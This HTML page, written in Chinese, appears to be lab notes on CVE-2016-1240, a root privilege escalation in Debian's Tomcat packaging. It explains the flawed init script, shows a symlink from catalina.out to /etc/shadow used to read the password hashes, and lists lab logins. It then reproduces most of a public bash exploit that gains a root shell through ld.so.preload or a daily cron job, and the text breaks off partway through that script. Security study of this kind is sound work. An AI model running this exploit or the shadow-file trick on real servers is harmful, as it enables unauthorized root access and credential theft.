<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs24C36B3{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.csAB8C65AA{text-align:left;margin:5pt 24pt 5pt 0pt;list-style-type:decimal;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.csBF12A472{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs6EDCDAE2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="X15a5284a902a9f7fd3bdcc2ab13e9c226593224"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2016-1240</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Tomcat</span><span class="csECDA2D3">本地提权漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Debian</span><span class="cs9C1B1871">系统的</span><span class="cs8926E06">Linux</span><span class="cs9C1B1871">上管理员通常利用</span><span class="cs8926E06">apt-get</span><span class="cs9C1B1871">进行包管理，</span><span class="cs8926E06">CVE-2016-1240</span><span class="cs9C1B1871">这一漏洞其问题出在</span><span class="cs8926E06">Tomcat</span><span class="cs9C1B1871">的</span><span class="cs8926E06">deb</span><span class="cs9C1B1871">包中</span><span class="cs8926E06">,</span><span class="cs9C1B1871">使</span><span class="cs8926E06"> deb</span><span class="cs9C1B1871">包安装的</span><span class="cs8926E06">Tomcat</span><span class="cs9C1B1871">程序会自动为管理员安装一个启动脚本：</span><span class="cs9FB05234">/etc/init.d/tocat*</span><span class="cs9C1B1871">利用该脚本，可导致攻击者通过低权限的</span><span class="cs8926E06">Tomcat</span><span class="cs9C1B1871">用户获得系统</span><span class="cs8926E06">root</span><span class="cs9C1B1871">权限！</span></p><h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Tomcat 8 &lt;= 8.0.36-2 Tomcat 7 &lt;= 7.0.70-2 Tomcat 6 &lt;= 6.0.45+dfsg-1~deb8u1</span></p><h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs8926E06">Debian</span><span class="cs9C1B1871">系统的</span><span class="cs8926E06">Linux</span><span class="cs9C1B1871">上管理员通常利用</span><span class="cs8926E06">apt-get</span><span class="cs9C1B1871">进行包管理，</span><span class="cs8926E06">CVE-2016-1240</span><span class="cs9C1B1871">这一漏洞其问题出在</span><span class="cs8926E06">Tomcat</span><span class="cs9C1B1871">的</span><span class="cs8926E06">deb</span><span class="cs9C1B1871">包中</span><span class="cs8926E06">,</span><span class="cs9C1B1871">使用</span><span class="cs8926E06">deb</span><span class="cs9C1B1871">包安装的</span><span class="cs8926E06">Tomcat</span><span class="cs9C1B1871">程序会自动为管理员安装一个启动脚本：</span><span class="cs8926E06">/etc/init.d/tomcat&lt;</span><span class="cs9C1B1871">版本号</span><span class="cs8926E06">&gt;.sh</span><span class="cs9C1B1871">。利用该脚本，可导致攻击者通过低权限的</span><span class="cs8926E06">Tomcat</span><span class="cs9C1B1871">用户获得系统</span><span class="cs8926E06">root</span><span class="cs9C1B1871">权限。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">现在我们查看文件</span><span class="cs8926E06"> /etc/init.d/tomcat7 </span><span class="cs9C1B1871">操作如下：</span><span class="cs8926E06"> </span><span class="cs9C1B1871">首先我们使用</span><span class="cs8926E06"> Evrething</span><span class="cs9C1B1871">搜索</span><span class="cs9FB05234">xshell</span><span class="cs9C1B1871">，选中</span><span class="cs8926E06">xshell.exe</span><span class="cs9C1B1871">运行</span><span class="cs8926E06">xshell</span><span class="cs9C1B1871">，然后连接上目标机的低权限用户</span><span class="cs8926E06">tomcat7</span><span class="cs9C1B1871">，账号是</span><span class="cs8926E06">tomcat7</span><span class="cs9C1B1871">，密码是：</span><span class="cs8926E06">tomcat7</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%ef%bc%88CVE-2016-1240%ef%bc%89Tomcat%e6%9c%ac%e5%9c%b0%e6%8f%90%e6%9d%83%e6%bc%8f%e6%b4%9e_files/image0.gif" width="560" height="420" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后执行命令</span><span class="cs9FB05234">whoami</span><span class="cs9C1B1871">，可以看到，现在是</span><span class="cs8926E06">tomcat7</span><span class="cs9C1B1871">的权限，也就是低权限账户</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%ef%bc%88CVE-2016-1240%ef%bc%89Tomcat%e6%9c%ac%e5%9c%b0%e6%8f%90%e6%9d%83%e6%bc%8f%e6%b4%9e_files/image1.gif" width="560" height="119" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后执行命令</span><span class="cs9FB05234">vim /etc/init.d/tomcat7</span><span class="cs8926E06">, </span><span class="cs9C1B1871">然后按</span><span class="cs9FB05234">Esc</span><span class="cs9C1B1871">键</span><span class="cs8926E06">,</span><span class="cs9C1B1871">接下来输入英文状态下的字符冒号</span><span class="cs8926E06">: </span><span class="cs9FB05234">set number</span><span class="cs8926E06">,</span><span class="cs9C1B1871">找到</span><span class="cs8926E06">171</span><span class="cs9C1B1871">行。</span></p><p class="cs6FD73CFB"><span class="csE3F655E4">小提示</span><span class="cs5BEC2C28">:</span><span class="cs8926E06">vim</span><span class="cs9C1B1871">是一个文本编辑器，</span><span class="cs9FB05234">vim /etc/init.d/tomcat7</span><span class="cs9C1B1871">的意思是编辑</span><span class="cs8926E06">/etc/init.d/</span><span class="cs9C1B1871">文件夹下的</span><span class="cs8926E06">tomcat7</span><span class="cs9C1B1871">文件。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%ef%bc%88CVE-2016-1240%ef%bc%89Tomcat%e6%9c%ac%e5%9c%b0%e6%8f%90%e6%9d%83%e6%bc%8f%e6%b4%9e_files/image2.gif" width="560" height="420" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">其造成漏洞核心代码如下：</span></p><p class="cs3A447A38"><span class="cs9FB05234"># Run the catalina.sh script as a daemon </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">set +e </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">touch &quot;$CATALINA_PID&quot; &quot;$CATALINA_BASE&quot;/logs/catalina.out</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">chown $TOMCAT6_USER &quot;$CATALINA_PID&quot; &quot;$CATALINA_BASE&quot;/logs/catalina.out</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">我们阅读上面的</span><span class="cs8926E06">shell</span><span class="cs9C1B1871">脚本</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">第一行，</span><span class="cs9FB05234">set +e</span><span class="cs8926E06">,</span><span class="cs9C1B1871">要知道</span><span class="cs9FB05234">set +e</span><span class="cs9C1B1871">是什么意思，得先清楚</span><span class="cs8926E06">set -e</span><span class="cs9C1B1871">的含义：</span><span class="cs8926E06"> </span><span class="cs9C1B1871">使用</span><span class="cs8926E06">set</span><span class="cs9C1B1871">更改</span><span class="cs8926E06">shell</span><span class="cs9C1B1871">特性时，符号</span><span class="cs8926E06">&quot;+&quot;</span><span class="cs9C1B1871">和</span><span class="cs8926E06">&quot;-&quot;</span><span class="cs9C1B1871">的作用分别是打开和关闭指定的模式</span><span class="cs8926E06">,</span><span class="cs9FB05234">set -e</span><span class="cs9C1B1871">的意思是若指令传回值不等于</span><span class="cs8926E06">0</span><span class="cs9C1B1871">，则立即退出</span><span class="cs8926E06">shell</span><span class="cs9C1B1871">，而</span><span class="cs9FB05234">set +e</span><span class="cs9C1B1871">的意思反之</span></li><li class="cs24C36B3"><span class="cs9C1B1871">第二行，</span><span class="cs8926E06">touch</span><span class="cs9C1B1871">是创建文件夹的意思，创建了</span><span class="cs8926E06">catalina.out</span><span class="cs9C1B1871">日志文件，前面的两个字符串定位了</span><span class="cs8926E06">PID</span><span class="cs9C1B1871">和</span><span class="cs8926E06">BASE</span><span class="cs9C1B1871">，涉及到其他变量这里不做探讨</span></li><li class="cs24C36B3"><span class="cs9C1B1871">第三行，</span><span class="cs8926E06">chown</span><span class="cs9C1B1871">是改变文件夹权限的命令，它将</span><span class="cs8926E06">catalina.out</span><span class="cs9C1B1871">日志文件的所述用户更改为低权限用户</span></li></ul>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">这个脚本看似是没有什么问题的。但是从上面的脚本可以得出三点信息：</span></p><ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="csAB8C65AA"><span class="cs9C1B1871">这个脚本运行时的权限必然是</span><span class="cs8926E06">root</span><span class="cs9C1B1871">权限。因为普通用户是无法使用</span><span class="cs9FB05234">chown</span><span class="cs9C1B1871">命令，也就是没有更高的权限。</span></li><li class="csAB8C65AA"><span class="cs9C1B1871">该脚本使用</span><span class="cs8926E06">touch</span><span class="cs9C1B1871">命令创建文件，此时存在以下：文件存在、不存在、存在为符号链接等情况，当文件为符号链接时会默认地对链接的文件进行操作。</span></li><li class="csAB8C65AA"><span class="cs9C1B1871">脚本运行完毕后</span><span class="cs8926E06">Tomcat</span><span class="cs9C1B1871">服务器启动，此时</span><span class="cs8926E06">catalina.out</span><span class="cs9C1B1871">这个</span><span class="cs8926E06">log</span><span class="cs9C1B1871">文件的所属用户为</span><span class="cs8926E06">tomcat</span><span class="cs9C1B1871">，所属组为</span><span class="cs8926E06">root</span><span class="cs9C1B1871">。</span></li></ol>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">综述上述，这就给漏洞利用创造了可能。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">接下来我们来验证是否可以利用：</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">当前的用户为</span><span class="cs8926E06">tomcat7</span><span class="cs9C1B1871">。这就是说我们能够更改所属用户为</span><span class="cs8926E06">tomcat7</span><span class="cs9C1B1871">的</span><span class="cs8926E06">catalina.out</span><span class="cs9C1B1871">这个</span><span class="cs8926E06">log</span><span class="cs9C1B1871">文件的内容和属性。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">更改它的属性，让他指向</span><span class="cs8926E06">/etc/shadow/</span><span class="cs9C1B1871">文件夹下，现在我们创建一个指向</span><span class="cs8926E06"> /etc/shadow </span><span class="cs9C1B1871">的符号链接。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">使用命令</span><span class="cs9FB05234">ln -fs /etc/shadow /var/log/tomcat7/catalina.out</span><span class="cs8926E06">,</span><span class="cs9C1B1871">这时候就可以在</span><span class="cs8926E06">/etc/shadow</span><span class="cs9C1B1871">下创建一个链接，就相当于</span><span class="cs8926E06">Windows</span><span class="cs9C1B1871">的快捷方式一样。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%ef%bc%88CVE-2016-1240%ef%bc%89Tomcat%e6%9c%ac%e5%9c%b0%e6%8f%90%e6%9d%83%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="140" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">此时我们查看文件</span><span class="cs8926E06">cataline.out</span><span class="cs9C1B1871">的内容，此时是权限不够，禁止读取</span><span class="cs8926E06">cataline.out</span><span class="cs9C1B1871">的内容的：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%ef%bc%88CVE-2016-1240%ef%bc%89Tomcat%e6%9c%ac%e5%9c%b0%e6%8f%90%e6%9d%83%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="152" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">现在我们需要登陆</span><span class="cs8926E06">root</span><span class="cs9C1B1871">账户重启</span><span class="cs8926E06">tomcat</span><span class="cs9C1B1871">。登陆方法与登陆</span><span class="cs8926E06">Tomcat7 </span><span class="cs9C1B1871">用户相同，账号为：</span><span class="cs8926E06">root, </span><span class="cs9C1B1871">密码为：</span><span class="cs8926E06">123456 </span><span class="cs9C1B1871">。重启</span><span class="cs8926E06">Tomcat</span><span class="cs9C1B1871">的命令为：</span></p><p class="cs3A447A38"><span class="cs9FB05234">service tomcat7 restart</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">重启成功之后我们再次使用</span><span class="cs7FFD2630">低权限用户</span><span class="cs9C1B1871">读取</span><span class="cs8926E06">cataline.out</span><span class="cs9C1B1871">的内容：使用命令</span></p><p class="cs3A447A38"><span class="cs9FB05234">head /var/log/tomcat6/catalina.out</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">使用</span><span class="cs8926E06">head</span><span class="cs9C1B1871">命令可以输出文件前十行的内容，而</span><span class="cs9FB05234">cat</span><span class="cs9C1B1871">命令则是预览文件的全部内容。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%ef%bc%88CVE-2016-1240%ef%bc%89Tomcat%e6%9c%ac%e5%9c%b0%e6%8f%90%e6%9d%83%e6%bc%8f%e6%b4%9e_files/image3.gif" width="560" height="301" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="csE3F655E4">原理</span><span class="cs5BEC2C28">:</span><span class="cs9C1B1871">当</span><span class="cs8926E06">Tomcat</span><span class="cs9C1B1871">服务重启时，系统默认重新加载</span><span class="cs9FB05234">/var/log/tomcat6/catalina.out</span><span class="cs9C1B1871">脚本，由于此时</span><span class="cs8926E06">tomcat</span><span class="cs9C1B1871">的日志文件指向了</span><span class="cs9FB05234">/etc/shadow</span><span class="cs7FFD2630">文件</span><span class="cs8926E06">; </span><span class="cs9C1B1871">而该文件就是我们之前创建的链接文件，而链接文件属于</span><span class="cs8926E06">Tomcat7</span><span class="cs9C1B1871">这个</span><span class="cs7FFD2630">低权限用户</span><span class="cs9C1B1871">，因此，我们就可以查看其中内容了。</span></p><h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">本步将使用</span><span class="cs8926E06">poc</span><span class="cs9C1B1871">根据</span><span class="cs8926E06">Tomcat7</span><span class="cs9C1B1871">漏洞进行提权</span></p><h4 class="cs868C439D">
			<a name="poc"><span class="csBF12A472">poc</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">#!/bin/bash</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Tomcat 6/7/8 on Debian-based distros - Local Root Privilege Escalation Exploit</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># CVE-2016-1240</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Discovered and coded by:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Dawid Golunski</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># http://legalhackers.com</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># This exploit targets Tomcat (versions 6, 7 and 8) packaging on </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Debian-based distros including Debian, Ubuntu etc.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># It allows attackers with a tomcat shell (e.g. obtained remotely through a </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># vulnerable java webapp, or locally via weak permissions on webapps in the </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Tomcat webroot directories etc.) to escalate their privileges to root.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Usage:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># ./tomcat-rootprivesc-deb.sh path_to_catalina.out [-deferred]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># The exploit can used in two ways:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># -active (assumed by default) - which waits for a Tomcat restart in a loop and instantly</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># gains/executes a rootshell via ld.so.preload as soon as Tomcat service is restarted. </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># It also gives attacker a chance to execute: kill [tomcat-pid] command to force/speed up</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># a Tomcat restart (done manually by an admin, or potentially by some tomcat service watchdog etc.)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># -deferred (requires the -deferred switch on argv[2]) - this mode symlinks the logfile to </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># /etc/default/locale and exits. It removes the need for the exploit to run in a loop waiting. </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Attackers can come back at a later time and check on the /etc/default/locale file. Upon a </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Tomcat restart / server reboot, the file should be owned by tomcat user. The attackers can</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># then add arbitrary commands to the file which will be executed with root privileges by </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># the /etc/cron.daily/tomcatN logrotation cronjob (run daily around 6:25am on default </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Ubuntu/Debian Tomcat installations).</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># See full advisory for details at:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># http://legalhackers.com/advisories/Tomcat-DebPkgs-Root-Privilege-Escalation-Exploit-CVE-2016-1240.html</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Disclaimer:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># For testing purposes only. Do no harm.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">BACKDOORSH=&quot;/bin/bash&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">BACKDOORPATH=&quot;/tmp/tomcatrootsh&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">PRIVESCLIB=&quot;/tmp/privesclib.so&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">PRIVESCSRC=&quot;/tmp/privesclib.c&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">SUIDBIN=&quot;/usr/bin/sudo&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">function cleanexit {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Cleanup </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo -e &quot;\n[+] Cleaning up...&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;rm -f $PRIVESCSRC</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;rm -f $PRIVESCLIB</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;rm -f $TOMCATLOG</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;touch $TOMCATLOG</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if [ -f /etc/ld.so.preload ]; then</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo -n &gt; /etc/ld.so.preload 2&gt;/dev/null</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fi</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo -e &quot;\n[+] Job done. Exiting with code $1 \n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exit $1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">function ctrl_c() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo -e &quot;\n[+] Active exploitation aborted. Remember you can use -deferred switch for deferred exploitation.&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;cleanexit 0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">#intro </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo -e &quot;\033[94m \nTomcat 6/7/8 on Debian-based distros - Local Root Privilege Escalation Exploit\nCVE-2016-1240\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo -e &quot;Discovered and coded by: \n\nDawid Golunski \nhttp://legalhackers.com \033[0m&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Args</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if [ $# -lt 1 ]; then</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo -e &quot;\n[!] Exploit usage: \n\n$0 path_to_catalina.out [-deferred]\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exit 3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">fi</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if [ &quot;$2&quot; = &quot;-deferred&quot; ]; then</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;mode=&quot;deferred&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">else</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;mode=&quot;active&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">fi</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Priv check</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo -e &quot;\n[+] Starting the exploit in [\033[94m$mode\033[0m] mode with the following privileges: \n`id`&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">id | grep -q tomcat</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if [ $? -ne 0 ]; then</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo -e &quot;\n[!] You need to execute the exploit as tomcat user! Exiting.\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exit 3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">fi</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Set target paths</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">TOMCATLOG=&quot;$1&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if [ ! -f $TOMCATLOG ]; then</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo -e &quot;\n[!] The specified Tomcat catalina.out log ($TOMCATLOG) doesn&#39;t exist. Try again.\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exit 3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">fi</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo -e &quot;\n[+] Target Tomcat log file set to $TOMCATLOG&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># [ Deferred exploitation ]</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Symlink the log file to /etc/default/locale file which gets executed daily on default</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># tomcat installations on Debian/Ubuntu by the /etc/cron.daily/tomcatN logrotation cronjob around 6:25am.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Attackers can freely add their commands to the /etc/default/locale script after Tomcat has been</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># restarted and file owner gets changed.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if [ &quot;$mode&quot; = &quot;deferred&quot; ]; then</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;rm -f $TOMCATLOG &amp;&amp; ln -s /etc/default/locale $TOMCATLOG</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if [ $? -ne 0 ]; then</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo -e &quot;\n[!] Couldn&#39;t remove the $TOMCATLOG file or create a symlink.&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cleanexit 3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fi</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo -e &nbsp;&quot;\n[+] Symlink created at: \n`ls -l $TOMCATLOG`&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo -e &nbsp;&quot;\n[+] The current owner of the file is: \n`ls -l /etc/default/locale`&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo -ne &quot;\n[+] Keep an eye on the owner change on /etc/default/locale . After the Tomcat restart / system reboot&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo -ne &quot;\n &nbsp;&nbsp;&nbsp;you&#39;ll be able to add arbitrary commands to the file which will get executed with root privileges&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo -ne &quot;\n &nbsp;&nbsp;&nbsp;at ~6:25am by the /etc/cron.daily/tomcatN log rotation cron. See also -active mode if you can&#39;t wait ;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> \n\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exit 0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">fi</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># [ Active exploitation ]</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">trap ctrl_c INT</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Compile privesc preload library</span><span class="cs8926E06"><br/></span><span 